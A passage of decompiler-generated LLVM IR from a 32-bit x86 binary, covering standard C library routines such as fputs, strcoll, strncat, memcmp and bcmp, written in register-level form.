  %v1_80669ed = add i32 %arg1, 4
  %v2_80669ed = inttoptr i32 %v1_80669ed to i32*
  %v3_80669ed = load i32, i32* %v2_80669ed, align 4
  %v4_80669f0 = call i32 @__libc_lseek64(i32 %v3_80669ed, i32 %v2_80669e7, i32 %v3_80669e4, i32 %arg3)
  %v0_80669f8 = load i32, i32* @edx, align 4
  %v2_80669f8 = icmp slt i32 %v0_80669f8, 0
  store i32 %v4_80669f0, i32* %ecx.global-to-local, align 4
  br i1 %v2_80669f8, label %dec_label_pc_8066a05, label %dec_label_pc_80669fe

dec_label_pc_80669fe:                             ; preds = %entry
  %v1_80669fe = load i32, i32* @ebx, align 4
  %v2_80669fe = inttoptr i32 %v1_80669fe to i32*
  store i32 %v4_80669f0, i32* %v2_80669fe, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8066a02 = load i32, i32* @edx, align 4
  %v1_8066a02 = load i32, i32* @ebx, align 4
  %v2_8066a02 = add i32 %v1_8066a02, 4
  %v3_8066a02 = inttoptr i32 %v2_8066a02 to i32*
  store i32 %v0_8066a02, i32* %v3_8066a02, align 4
  %v0_8066a06.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066a05

dec_label_pc_8066a05:                             ; preds = %entry, %dec_label_pc_80669fe
  %v0_8066a06 = phi i32 [ %v4_80669f0, %entry ], [ %v0_8066a06.pre, %dec_label_pc_80669fe ]
  ret i32 %v0_8066a06

; uselistorder directives
  uselistorder i32 %v4_80669f0, { 0, 2, 1 }
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8066a05, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8066a0c = load i32, i32* @edi, align 4
  %v0_8066a0d = load i32, i32* @esi, align 4
  %v0_8066a0e = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_8066a16 = add i32 %arg2, 52
  %v2_8066a16 = inttoptr i32 %v1_8066a16 to i32*
  %v3_8066a16 = load i32, i32* %v2_8066a16, align 4
  store i32 %v3_8066a16, i32* @edi, align 4
  %v1_8066a19 = icmp eq i32 %v3_8066a16, 0
  %v1_8066a1b = icmp eq i1 %v1_8066a19, false
  br i1 %v1_8066a1b, label %entry.dec_label_pc_8066a3c_crit_edge, label %dec_label_pc_8066a1d

entry.dec_label_pc_8066a3c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8066a3c

dec_label_pc_8066a1d:                             ; preds = %entry
  %v1_8066a1d = add i32 %arg2, 56
  store i32 %v1_8066a1d, i32* @ebx, align 4
  %v4_8066a2c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134589241, i32 %v1_8066a1d)
  %v0_8066a31 = load i32, i32* @ebx, align 4
  %v1_8066a34 = call i32 @pthread_mutex_lock(i32 %v0_8066a31)
  %v0_8066a3e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066a3c

dec_label_pc_8066a3c:                             ; preds = %entry.dec_label_pc_8066a3c_crit_edge, %dec_label_pc_8066a1d
  %v0_8066a3e = phi i32 [ %arg2, %entry.dec_label_pc_8066a3c_crit_edge ], [ %v0_8066a3e.pre, %dec_label_pc_8066a1d ]
  %v0_8066a3c = load i32, i32* @edx, align 4
  %v4_8066a43 = inttoptr i32 %arg1 to i8*
  %v5_8066a43 = call i32 @__GI_fputs_unlocked(i8* %v4_8066a43, i32 %v0_8066a3e, i32 %v0_8066a3c, i32 %v0_8066a3c)
  store i32 %v5_8066a43, i32* @ebx, align 4
  br i1 %v1_8066a1b, label %dec_label_pc_8066a62, label %dec_label_pc_8066a51

dec_label_pc_8066a51:                             ; preds = %dec_label_pc_8066a3c
  %v3_8066a5a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8066a65.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8066a62

dec_label_pc_8066a62:                             ; preds = %dec_label_pc_8066a3c, %dec_label_pc_8066a51
  %v0_8066a65 = phi i32 [ %v5_8066a43, %dec_label_pc_8066a3c ], [ %v0_8066a65.pre, %dec_label_pc_8066a51 ]
  store i32 %v0_8066a0e, i32* @ebx, align 4
  store i32 %v0_8066a0d, i32* @esi, align 4
  store i32 %v0_8066a0c, i32* @edi, align 4
  ret i32 %v0_8066a65

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__pthread_cleanup_pop_restore, { 36, 38, 2, 40, 41, 14, 16, 17, 18, 19, 20, 21, 0, 1, 3, 4, 5, 37, 44, 34, 6, 7, 35, 45, 42, 43, 8, 9, 22, 23, 24, 25, 26, 27, 28, 15, 10, 39, 29, 30, 11, 12, 13, 31, 32, 33 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 15, 13, 58, 10, 11, 39, 38, 37, 36, 35, 34, 33, 60, 59, 57, 56, 55, 14, 5, 20, 54, 53, 19, 4, 0, 1, 2, 3, 52, 51, 32, 31, 30, 29, 28, 27, 26, 40, 44, 12, 25, 24, 43, 42, 41, 23, 22, 21, 50, 49, 61, 9, 6, 18, 8, 7, 48, 47, 46, 45, 17, 16 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 36, 38, 2, 41, 40, 15, 16, 17, 18, 19, 20, 21, 0, 1, 3, 4, 5, 37, 42, 34, 6, 7, 35, 45, 44, 43, 8, 9, 22, 23, 24, 25, 26, 27, 28, 14, 10, 39, 29, 30, 11, 12, 13, 31, 32, 33 }
  uselistorder i32 134589241, { 3, 4, 5, 6, 7, 8, 45, 48, 49, 50, 51, 52, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 34, 1, 35, 2, 36, 37, 38, 24, 25, 26, 27, 28, 29, 30, 39, 46, 40, 47, 41, 42, 44, 31, 43, 32, 33 }
  uselistorder i32 52, { 26, 27, 12, 6, 21, 7, 8, 9, 10, 31, 32, 22, 20, 13, 28, 29, 30, 23, 24, 17, 18, 19, 11, 0, 14, 2, 15, 1, 16, 4, 5, 3, 25 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8066a62, { 1, 0 }
  uselistorder label %dec_label_pc_8066a3c, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8066a6e = ptrtoint i8* %arg1 to i32
  %v4_8066a76.pre = load i32, i32* @eax, align 4
  %v8_8066a76.pre = load i1, i1* @df, align 1
  %v9_8066a76 = select i1 %v8_8066a76.pre, i32 -1, i32 1
  br label %dec_label_pc_8066a76

dec_label_pc_8066a76:                             ; preds = %dec_label_pc_8066a7a, %entry
  %v20_8066a77 = phi i32 [ %v23_8066a77, %dec_label_pc_8066a7a ], [ %arg2, %entry ]
  %v4_8066a76 = phi i32 [ %v6_8066a76, %dec_label_pc_8066a7a ], [ %v4_8066a76.pre, %entry ]
  %v7_8066a76 = phi i32 [ %v10_8066a76, %dec_label_pc_8066a7a ], [ %v4_8066a6e, %entry ]
  %v1_8066a76 = inttoptr i32 %v7_8066a76 to i8*
  %v2_8066a76 = load i8, i8* %v1_8066a76, align 1
  %v3_8066a77 = inttoptr i32 %v20_8066a77 to i8*
  %v4_8066a77 = load i8, i8* %v3_8066a77, align 1
  %v15_8066a77 = icmp eq i8 %v2_8066a76, %v4_8066a77
  %v1_8066a78 = icmp eq i1 %v15_8066a77, false
  br i1 %v1_8066a78, label %dec_label_pc_8066a82, label %dec_label_pc_8066a7a

dec_label_pc_8066a7a:                             ; preds = %dec_label_pc_8066a76
  %v3_8066a76 = zext i8 %v2_8066a76 to i32
  %v5_8066a76 = and i32 %v4_8066a76, -256
  %v6_8066a76 = or i32 %v3_8066a76, %v5_8066a76
  %v23_8066a77 = add i32 %v20_8066a77, %v9_8066a76
  %v10_8066a76 = add i32 %v7_8066a76, %v9_8066a76
  %v4_8066a7a = icmp eq i8 %v2_8066a76, 0
  %v1_8066a7c = icmp eq i1 %v4_8066a7a, false
  br i1 %v1_8066a7c, label %dec_label_pc_8066a76, label %dec_label_pc_8066a86

dec_label_pc_8066a82:                             ; preds = %dec_label_pc_8066a76
  br label %dec_label_pc_8066a86

dec_label_pc_8066a86:                             ; preds = %dec_label_pc_8066a7a, %dec_label_pc_8066a82
  %storemerge = phi i32 [ 1, %dec_label_pc_8066a82 ], [ 0, %dec_label_pc_8066a7a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8066a76, { 1, 2, 0 }
  uselistorder i32 %v9_8066a76, { 1, 0 }
  uselistorder label %dec_label_pc_8066a86, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8066a8f = load i32, i32* @esi, align 4
  store i32 %v0_8066a8f, i32* %stack_var_-8, align 4
  %v4_8066a93 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8066a93, i32* %esi.global-to-local, align 4
  %v4_8066a9b = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8066a9f = call i32 @_strlen(i8* %v4_8066a9b)
  %v2_8066aa1 = add i32 %tmp, -1
  store i32 %v2_8066aa1, i32* %edi.global-to-local, align 4
  %v8_8066aa513 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* @ecx, align 4
  br i1 %v8_8066aa513, label %dec_label_pc_8066ab0, label %dec_label_pc_8066aa8.lr.ph

dec_label_pc_8066aa8.lr.ph:                       ; preds = %entry
  %v4_8066aa8.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8066aa8.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8066aa8

dec_label_pc_8066aa8:                             ; preds = %dec_label_pc_8066aa8.lr.ph, %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge
  %v8_8066aa8 = phi i1 [ %v8_8066aa8.pre, %dec_label_pc_8066aa8.lr.ph ], [ %v5_8066aa9, %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge ]
  %v4_8066aa8 = phi i32 [ %v4_8066aa8.pre, %dec_label_pc_8066aa8.lr.ph ], [ %v0_8066aaa, %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge ]
  %v2_8066ab215 = phi i32 [ %v2_8066aa1, %dec_label_pc_8066aa8.lr.ph ], [ %v7_8066aa9, %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge ]
  %v0_8066aa8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066aa8 = inttoptr i32 %v0_8066aa8 to i8*
  %v2_8066aa8 = load i8, i8* %v1_8066aa8, align 1
  %v3_8066aa8 = zext i8 %v2_8066aa8 to i32
  %v5_8066aa8 = and i32 %v4_8066aa8, -256
  %v6_8066aa8 = or i32 %v5_8066aa8, %v3_8066aa8
  store i32 %v6_8066aa8, i32* %eax.global-to-local, align 4
  %v9_8066aa8 = select i1 %v8_8066aa8, i32 -1, i32 1
  %v10_8066aa8 = add i32 %v9_8066aa8, %v0_8066aa8
  store i32 %v10_8066aa8, i32* %esi.global-to-local, align 4
  %v3_8066aa9 = inttoptr i32 %v2_8066ab215 to i8*
  store i8 %v2_8066aa8, i8* %v3_8066aa9, align 1
  %v4_8066aa9 = load i32, i32* %edi.global-to-local, align 4
  %v5_8066aa9 = load i1, i1* @df, align 1
  %v6_8066aa9 = select i1 %v5_8066aa9, i32 -1, i32 1
  %v7_8066aa9 = add i32 %v6_8066aa9, %v4_8066aa9
  store i32 %v7_8066aa9, i32* %edi.global-to-local, align 4
  %v0_8066aaa = load i32, i32* %eax.global-to-local, align 4
  %v3_8066aaa = trunc i32 %v0_8066aaa to i8
  %v4_8066aaa = icmp eq i8 %v3_8066aaa, 0
  %v1_8066aac = icmp eq i1 %v4_8066aaa, false
  br i1 %v1_8066aac, label %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge, label %dec_label_pc_8066ab3

dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge: ; preds = %dec_label_pc_8066aa8
  %v0_8066aa5.pre = load i32, i32* @ecx, align 4
  %v1_8066aa5 = add i32 %v0_8066aa5.pre, -1
  %v8_8066aa5 = icmp eq i32 %v1_8066aa5, 0
  store i32 %v1_8066aa5, i32* @ecx, align 4
  br i1 %v8_8066aa5, label %dec_label_pc_8066ab0, label %dec_label_pc_8066aa8

dec_label_pc_8066ab0:                             ; preds = %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge, %entry
  %v2_8066ab2.lcssa = phi i32 [ %v2_8066aa1, %entry ], [ %v7_8066aa9, %dec_label_pc_8066aa8.dec_label_pc_8066aa5_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8066ab2 = inttoptr i32 %v2_8066ab2.lcssa to i8*
  store i8 0, i8* %v3_8066ab2, align 1
  %v4_8066ab2 = load i32, i32* %edi.global-to-local, align 4
  %v5_8066ab2 = load i1, i1* @df, align 1
  %v6_8066ab2 = select i1 %v5_8066ab2, i32 -1, i32 1
  %v7_8066ab2 = add i32 %v6_8066ab2, %v4_8066ab2
  store i32 %v7_8066ab2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8066ab3

dec_label_pc_8066ab3:                             ; preds = %dec_label_pc_8066aa8, %dec_label_pc_8066ab0
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8066ab7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8066ab7, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8066aa5, { 1, 0 }
  uselistorder i32 %v0_8066aaa, { 1, 0 }
  uselistorder i32 %v7_8066aa9, { 0, 2, 1 }
  uselistorder i1 %v5_8066aa9, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i1* @df, { 101, 102, 0, 1, 13, 103, 14, 104, 105, 24, 106, 2, 3, 113, 114, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 4, 5, 6, 7, 8, 9, 10, 11, 12, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 107, 108, 109, 110, 111, 112 }
  uselistorder label %dec_label_pc_8066ab3, { 1, 0 }
  uselistorder label %dec_label_pc_8066aa8, { 1, 0 }
}

define i32 @memcmp_bytes() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v15_8066abd = ptrtoint i32* %stack_var_-12 to i32
  %v0_8066ac0 = load i32, i32* @eax, align 4
  store i32 %v0_8066ac0, i32* %stack_var_-8, align 4
  %v2_8066ac4 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8066aca = load i32, i32* @edx, align 4
  store i32 %v0_8066aca, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8066acd

dec_label_pc_8066acd:                             ; preds = %dec_label_pc_8066acd, %entry
  %v0_8066ad1 = phi i32 [ %v1_8066ad4, %dec_label_pc_8066acd ], [ %v15_8066abd, %entry ]
  %v0_8066acd = phi i32 [ %v1_8066ad0, %dec_label_pc_8066acd ], [ %v2_8066ac4, %entry ]
  %v1_8066acd = inttoptr i32 %v0_8066acd to i8*
  %v2_8066acd = load i8, i8* %v1_8066acd, align 1
  %v3_8066acd = zext i8 %v2_8066acd to i32
  %v1_8066ad0 = add i32 %v0_8066acd, 1
  %v1_8066ad1 = inttoptr i32 %v0_8066ad1 to i8*
  %v2_8066ad1 = load i8, i8* %v1_8066ad1, align 1
  %v3_8066ad1 = zext i8 %v2_8066ad1 to i32
  %v1_8066ad4 = add i32 %v0_8066ad1, 1
  %v2_8066ad5 = sub nsw i32 %v3_8066acd, %v3_8066ad1
  %v12_8066ad5 = icmp eq i32 %v2_8066ad5, 0
  br i1 %v12_8066ad5, label %dec_label_pc_8066acd, label %dec_label_pc_8066ad9

dec_label_pc_8066ad9:                             ; preds = %dec_label_pc_8066acd
  store i32 %v0_8066aca, i32* @edx, align 4
  store i32 %v0_8066ac0, i32* @ecx, align 4
  ret i32 %v2_8066ad5

; uselistorder directives
  uselistorder i32 %v0_8066acd, { 1, 0 }
  uselistorder i32 %v0_8066ad1, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @bcmp() local_unnamed_addr {
entry:
  %tmp146 = call i8* @__decompiler_undefined_function_3()
  %tmp147 = call i8* @__decompiler_undefined_function_3()
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %v0_8066ae2 = load i32, i32* @ebx, align 4
  %v4_8066aeb = ptrtoint i8* %tmp147 to i32
  store i32 %v4_8066aeb, i32* @ecx, align 4
  %v4_8066aef = ptrtoint i8* %tmp146 to i32
  store i32 %v4_8066aef, i32* @ebx, align 4
  %v6_8066af3 = icmp ugt i32 %tmp148, 15
  br i1 %v6_8066af3, label %dec_label_pc_8066b10.preheader, label %dec_label_pc_8066d73.preheader

dec_label_pc_8066b10.preheader:                   ; preds = %entry
  %v2_8066b1045 = urem i32 %v4_8066aef, 4
  %v3_8066b1046 = icmp eq i32 %v2_8066b1045, 0
  %v1_8066b1752 = icmp eq i1 %v3_8066b1046, false
  br i1 %v1_8066b1752, label %dec_label_pc_8066afa, label %dec_label_pc_8066b19

dec_label_pc_8066afa:                             ; preds = %dec_label_pc_8066b10.preheader, %dec_label_pc_8066b0a
  %v0_8066b0e = phi i32 [ %v1_8066b0e, %dec_label_pc_8066b0a ], [ %v4_8066aeb, %dec_label_pc_8066b10.preheader ]
  %v0_8066b0f = phi i32 [ %v1_8066b0f, %dec_label_pc_8066b0a ], [ %v4_8066aef, %dec_label_pc_8066b10.preheader ]
  %stack_var_12.053 = phi i32 [ %v4_8066b0a, %dec_label_pc_8066b0a ], [ %tmp148, %dec_label_pc_8066b10.preheader ]
  %v1_8066afa = inttoptr i32 %v0_8066b0f to i8*
  %v2_8066afa = load i8, i8* %v1_8066afa, align 1
  %v3_8066afa = zext i8 %v2_8066afa to i32
  %v1_8066afd = inttoptr i32 %v0_8066b0e to i8*
  %v2_8066afd = load i8, i8* %v1_8066afd, align 1
  %v3_8066afd = zext i8 %v2_8066afd to i32
  %v2_8066b00 = sub nsw i32 %v3_8066afd, %v3_8066afa
  %v12_8066b00 = icmp eq i32 %v2_8066b00, 0
  store i32 %v2_8066b00, i32* @edx, align 4
  %v1_8066b04 = icmp eq i1 %v12_8066b00, false
  br i1 %v1_8066b04, label %dec_label_pc_8066d7c, label %dec_label_pc_8066b0a

dec_label_pc_8066b0a:                             ; preds = %dec_label_pc_8066afa
  %v4_8066b0a = add i32 %stack_var_12.053, -1
  %v1_8066b0e = add i32 %v0_8066b0e, 1
  store i32 %v1_8066b0e, i32* @ecx, align 4
  %v1_8066b0f = add i32 %v0_8066b0f, 1
  store i32 %v1_8066b0f, i32* @ebx, align 4
  %v2_8066b10 = urem i32 %v1_8066b0f, 4
  %v3_8066b10 = icmp eq i32 %v2_8066b10, 0
  %v1_8066b17 = icmp eq i1 %v3_8066b10, false
  br i1 %v1_8066b17, label %dec_label_pc_8066afa, label %dec_label_pc_8066b19

dec_label_pc_8066b19:                             ; preds = %dec_label_pc_8066b0a, %dec_label_pc_8066b10.preheader
  %v0_8066bf6 = phi i32 [ %v4_8066aeb, %dec_label_pc_8066b10.preheader ], [ %v1_8066b0e, %dec_label_pc_8066b0a ]
  %stack_var_12.0.lcssa = phi i32 [ %tmp148, %dec_label_pc_8066b10.preheader ], [ %v4_8066b0a, %dec_label_pc_8066b0a ]
  %v0_8066c62 = phi i32 [ %v4_8066aef, %dec_label_pc_8066b10.preheader ], [ %v1_8066b0f, %dec_label_pc_8066b0a ]
  %v1_8066b1b = urem i32 %v0_8066bf6, 4
  %v2_8066b1b = icmp eq i32 %v1_8066b1b, 0
  %v1_8066b22 = icmp eq i1 %v2_8066b1b, false
  br i1 %v1_8066b22, label %dec_label_pc_8066bdc, label %dec_label_pc_8066b28

dec_label_pc_8066b28:                             ; preds = %dec_label_pc_8066b19
  %v2_8066b2c = udiv i32 %stack_var_12.0.lcssa, 4
  %v1_8066b31 = urem i32 %v2_8066b2c, 4
  %v9_8066b34 = icmp eq i32 %v1_8066b31, 1
  br i1 %v9_8066b34, label %dec_label_pc_8066b68, label %dec_label_pc_8066b39

dec_label_pc_8066b39:                             ; preds = %dec_label_pc_8066b28
  %v2_8066b31 = icmp eq i32 %v1_8066b31, 0
  br i1 %v2_8066b31, label %dec_label_pc_8066b62, label %dec_label_pc_8066b3b

dec_label_pc_8066b3b:                             ; preds = %dec_label_pc_8066b39
  %v9_8066b3b = icmp eq i32 %v1_8066b31, 3
  %v1_8066b3e = inttoptr i32 %v0_8066bf6 to i32*
  %v2_8066b3e = load i32, i32* %v1_8066b3e, align 4
  %v1_8066b40 = inttoptr i32 %v0_8066c62 to i32*
  %v2_8066b40 = load i32, i32* %v1_8066b40, align 4
  br i1 %v9_8066b3b, label %dec_label_pc_8066b53, label %dec_label_pc_8066b44

dec_label_pc_8066b44:                             ; preds = %dec_label_pc_8066b3b
  %v1_8066b46 = add i32 %v0_8066bf6, -8
  store i32 %v1_8066b46, i32* @ecx, align 4
  store i32 %v2_8066b40, i32* @edx, align 4
  %v1_8066b4b = add i32 %v0_8066c62, -8
  store i32 %v1_8066b4b, i32* @ebx, align 4
  %v1_8066b4e = add nuw nsw i32 %v2_8066b2c, 2
  br label %dec_label_pc_8066ba3

dec_label_pc_8066b53:                             ; preds = %dec_label_pc_8066b3b
  %v1_8066b55 = add i32 %v0_8066bf6, -4
  store i32 %v1_8066b55, i32* @ecx, align 4
  %v1_8066b58 = add i32 %v0_8066c62, -4
  store i32 %v1_8066b58, i32* @ebx, align 4
  %v1_8066b5b = add nuw nsw i32 %v2_8066b2c, 1
  br label %dec_label_pc_8066b8f

dec_label_pc_8066b62:                             ; preds = %dec_label_pc_8066b39
  %v1_8066b62 = inttoptr i32 %v0_8066bf6 to i32*
  %v2_8066b62 = load i32, i32* %v1_8066b62, align 4
  store i32 %v2_8066b62, i32* @eax, align 4
  %v1_8066b64 = inttoptr i32 %v0_8066c62 to i32*
  %v2_8066b64 = load i32, i32* %v1_8066b64, align 4
  store i32 %v2_8066b64, i32* @edx, align 4
  br label %dec_label_pc_8066b81

dec_label_pc_8066b68:                             ; preds = %dec_label_pc_8066b28
  %v1_8066b68 = inttoptr i32 %v0_8066bf6 to i32*
  %v2_8066b68 = load i32, i32* %v1_8066b68, align 4
  %v1_8066b6a = add nsw i32 %v2_8066b2c, -1
  %v1_8066b6b = add i32 %v0_8066bf6, 4
  store i32 %v1_8066b6b, i32* @ecx, align 4
  %v1_8066b72 = inttoptr i32 %v0_8066c62 to i32*
  %v2_8066b72 = load i32, i32* %v1_8066b72, align 4
  %v1_8066b74 = add i32 %v0_8066c62, 4
  br label %dec_label_pc_8066b77

dec_label_pc_8066b77:                             ; preds = %dec_label_pc_8066bb8, %dec_label_pc_8066b68
  %v0_8066bb375 = phi i32 [ %v1_8066b6a, %dec_label_pc_8066b68 ], [ %v1_8066bb3, %dec_label_pc_8066bb8 ]
  %v0_8066b7b = phi i32 [ %v1_8066b6b, %dec_label_pc_8066b68 ], [ %v1_8066bb8, %dec_label_pc_8066bb8 ]
  %v4_8066b77 = phi i32 [ %v2_8066b72, %dec_label_pc_8066b68 ], [ %v3_8066bae, %dec_label_pc_8066bb8 ]
  %storemerge24.in = phi i32 [ %v1_8066b74, %dec_label_pc_8066b68 ], [ %v1_8066bbb, %dec_label_pc_8066bb8 ]
  %stack_var_-48.0 = phi i32 [ %v2_8066b68, %dec_label_pc_8066b68 ], [ %v3_8066ba3, %dec_label_pc_8066bb8 ]
  store i32 %storemerge24.in, i32* @ebx, align 4
  %v15_8066b77 = icmp eq i32 %stack_var_-48.0, %v4_8066b77
  %v1_8066b7b = inttoptr i32 %v0_8066b7b to i32*
  %v2_8066b7b = load i32, i32* %v1_8066b7b, align 4
  store i32 %v2_8066b7b, i32* @eax, align 4
  %v1_8066b7d = inttoptr i32 %storemerge24.in to i32*
  %v2_8066b7d = load i32, i32* %v1_8066b7d, align 4
  store i32 %v2_8066b7d, i32* @edx, align 4
  %v1_8066b7f = icmp eq i1 %v15_8066b77, false
  br i1 %v1_8066b7f, label %dec_label_pc_8066bcc, label %dec_label_pc_8066b81

dec_label_pc_8066b81:                             ; preds = %dec_label_pc_8066b77, %dec_label_pc_8066b62
  %v0_8066bb374 = phi i32 [ %v0_8066bb375, %dec_label_pc_8066b77 ], [ %v2_8066b2c, %dec_label_pc_8066b62 ]
  %v0_8066b8a = phi i32 [ %storemerge24.in, %dec_label_pc_8066b77 ], [ %v0_8066c62, %dec_label_pc_8066b62 ]
  %v1_8066b84 = phi i32 [ %v2_8066b7d, %dec_label_pc_8066b77 ], [ %v2_8066b64, %dec_label_pc_8066b62 ]
  %v0_8066b84 = phi i32 [ %v2_8066b7b, %dec_label_pc_8066b77 ], [ %v2_8066b62, %dec_label_pc_8066b62 ]
  %v0_8066b81 = phi i32 [ %v0_8066b7b, %dec_label_pc_8066b77 ], [ %v0_8066bf6, %dec_label_pc_8066b62 ]
  %v1_8066b81 = add i32 %v0_8066b81, 4
  %v2_8066b81 = inttoptr i32 %v1_8066b81 to i32*
  %v3_8066b81 = load i32, i32* %v2_8066b81, align 4
  %v12_8066b84 = icmp eq i32 %v0_8066b84, %v1_8066b84
  %v1_8066b8a = add i32 %v0_8066b8a, 4
  %v2_8066b8a = inttoptr i32 %v1_8066b8a to i32*
  %v3_8066b8a = load i32, i32* %v2_8066b8a, align 4
  %v1_8066b8d = icmp eq i1 %v12_8066b84, false
  br i1 %v1_8066b8d, label %dec_label_pc_8066bd2, label %dec_label_pc_8066b8f

dec_label_pc_8066b8f:                             ; preds = %dec_label_pc_8066b81, %dec_label_pc_8066b53
  %v0_8066bb373 = phi i32 [ %v0_8066bb374, %dec_label_pc_8066b81 ], [ %v1_8066b5b, %dec_label_pc_8066b53 ]
  %v0_8066b96 = phi i32 [ %v0_8066b8a, %dec_label_pc_8066b81 ], [ %v1_8066b58, %dec_label_pc_8066b53 ]
  %v0_8066b93 = phi i32 [ %v0_8066b81, %dec_label_pc_8066b81 ], [ %v1_8066b55, %dec_label_pc_8066b53 ]
  %v0_8066b9f = phi i32 [ %v3_8066b8a, %dec_label_pc_8066b81 ], [ %v2_8066b40, %dec_label_pc_8066b53 ]
  %stack_var_-20.0 = phi i32 [ %v3_8066b81, %dec_label_pc_8066b81 ], [ %v2_8066b3e, %dec_label_pc_8066b53 ]
  %v15_8066b8f = icmp eq i32 %stack_var_-20.0, %v0_8066b9f
  %v1_8066b93 = add i32 %v0_8066b93, 8
  %v2_8066b93 = inttoptr i32 %v1_8066b93 to i32*
  %v3_8066b93 = load i32, i32* %v2_8066b93, align 4
  %v1_8066b96 = add i32 %v0_8066b96, 8
  %v2_8066b96 = inttoptr i32 %v1_8066b96 to i32*
  %v3_8066b96 = load i32, i32* %v2_8066b96, align 4
  store i32 %v3_8066b96, i32* @edx, align 4
  br i1 %v15_8066b8f, label %dec_label_pc_8066ba3, label %dec_label_pc_8066b9b

dec_label_pc_8066b9b:                             ; preds = %dec_label_pc_8066b8f
  store i32 %stack_var_-20.0, i32* @eax, align 4
  store i32 %v0_8066b9f, i32* @edx, align 4
  br label %dec_label_pc_8066bd2

dec_label_pc_8066ba3:                             ; preds = %dec_label_pc_8066b8f, %dec_label_pc_8066b44
  %v0_8066bb3 = phi i32 [ %v0_8066bb373, %dec_label_pc_8066b8f ], [ %v1_8066b4e, %dec_label_pc_8066b44 ]
  %v0_8066bbb = phi i32 [ %v0_8066b96, %dec_label_pc_8066b8f ], [ %v1_8066b4b, %dec_label_pc_8066b44 ]
  %v1_8066ba6 = phi i32 [ %v3_8066b96, %dec_label_pc_8066b8f ], [ %v2_8066b40, %dec_label_pc_8066b44 ]
  %v0_8066bac = phi i32 [ %v3_8066b93, %dec_label_pc_8066b8f ], [ %v2_8066b3e, %dec_label_pc_8066b44 ]
  %v0_8066bb8 = phi i32 [ %v0_8066b93, %dec_label_pc_8066b8f ], [ %v1_8066b46, %dec_label_pc_8066b44 ]
  %v1_8066ba3 = add i32 %v0_8066bb8, 12
  %v2_8066ba3 = inttoptr i32 %v1_8066ba3 to i32*
  %v3_8066ba3 = load i32, i32* %v2_8066ba3, align 4
  %v12_8066ba6 = icmp eq i32 %v0_8066bac, %v1_8066ba6
  store i32 %v0_8066bac, i32* @eax, align 4
  %v1_8066bae = add i32 %v0_8066bbb, 12
  %v2_8066bae = inttoptr i32 %v1_8066bae to i32*
  %v3_8066bae = load i32, i32* %v2_8066bae, align 4
